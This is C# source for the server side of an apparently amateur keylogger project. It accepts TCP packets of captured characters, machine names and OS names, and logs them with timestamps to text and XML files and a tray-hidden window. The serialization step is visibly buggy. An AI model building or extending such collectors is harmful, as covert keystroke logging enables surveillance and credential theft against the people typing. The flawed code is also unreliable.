using KeyLogger;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Xml.Serialization;

namespace Server
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        StreamReader reader;
         StreamWriter writer;
        TcpClient tcp = new TcpClient();
        TcpListener listener = new TcpListener(IPAddress.Parse("127.0.0.1"),10000);
        CancellationTokenSource source;
        Task recieveTask;
        ObservableCollection<Package> packages = new ObservableCollection<Package>();

        System.Windows.Forms.NotifyIcon ni = new System.Windows.Forms.NotifyIcon();
        XmlSerializer formatter = new XmlSerializer(typeof(Package[]));


        public MainWindow()
        {


            ni.Icon = new System.Drawing.Icon("gato_icon_134883 (1).ico");
            InitializeComponent();
            DataContext = this;

           

            listener.Start();


            Task t = new Task(connectTcp);
            t.Start();

            
        }
       
       

        public ObservableCollection<Package> Packages => packages;

        public void connectTcp()
        {
            tcp = listener.AcceptTcpClientAsync().Result;
            CreateReceiveTask();
        }
        private async void CreateReceiveTask()
        {
            var ns = tcp.GetStream();
            reader = new StreamReader(ns);
            writer = new StreamWriter(ns);
            source = new CancellationTokenSource();
            writer.AutoFlush = true;
             recieveTask = Task.Factory.StartNew(() => { Receved(source.Token); });

        }
        private void Receved(CancellationToken token)
        {
            while (true)
            {
                if (token.IsCancellationRequested)
                {
                    break;
                }
                var buf = new byte[1024];
                var amount = tcp.Client.Receive(buf);

                var s = Encoding.UTF8.GetString(buf, 0, amount);
                var ss = s.Split(new char[] { ';' }, StringSplitOptions.RemoveEmptyEntries);
                var pt = (PackageType)Convert.ToInt32(ss[0]);

                switch (pt)
                {
                    case PackageType.Send:
                        {




                            FileStream fs = new FileStream("Packeges.xml",FileMode.OpenOrCreate);

                            // eror
                            var p = new Package() { Char = ss[1], Date = DateTime.Now.ToLongTimeString(), MachineName = ss[2], OS = ss[3] };
                            File.AppendAllText("File.txt", ss[1] + " " + DateTime.Now.ToLongTimeString() + " " + ss[2] + " " + ss[3] + "\n");
                            formatter.Serialize(fs, p);
                            Dispatcher.Invoke(() => { packages.Add(p); });
                            
                            
                            

                            
                            

                           
                           


                        }
                        break;

                }
            }
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {

            ni.Visible = true;
            ni.DoubleClick += (sndr, args) =>
            {
                this.Show();
                this.WindowState = WindowState.Normal;
            };
            this.Hide();

        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {

        }
    }
}
